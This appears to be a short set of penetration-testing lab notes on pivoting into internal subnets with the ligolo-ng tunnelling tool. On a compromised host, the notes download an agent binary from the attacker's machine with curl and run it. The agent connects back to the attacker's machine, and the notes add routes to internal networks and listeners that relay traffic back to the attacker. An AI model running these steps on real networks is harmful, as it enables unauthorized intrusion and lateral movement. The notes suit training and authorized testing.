- after connection  via ssh
```
curl http://10.10.14.201:8888/pivot/ligolo-ng/agent -o agent
chmod +x agent
```
- Run on attacker
```
sudo ip tuntap add user rohaki mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

- Run on dmz01 
```
./agent -connect 10.10.14.201:11601 -ignore-cert
```

- Run on attacker
```
sudo ip route add 172.16.0.0/24 dev ligolo
sudo ip route add 172.18.0.0/24 dev ligolo
sudo ip route add 172.16.8.0/24 dev ligolo
```
- set up listener
```
# Creates a listener on the machine where we're running the agent at port 1234  
# and redirects the traffic to port 4444 on our machine.

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
listener_add --addr 0.0.0.0:8888 --to 0.0.0.0:8888
listener_add --addr 0.0.0.0:9999 --to 0.0.0.0:9999
listener_add --addr 0.0.0.0:135 --to 0.0.0.0:135
```
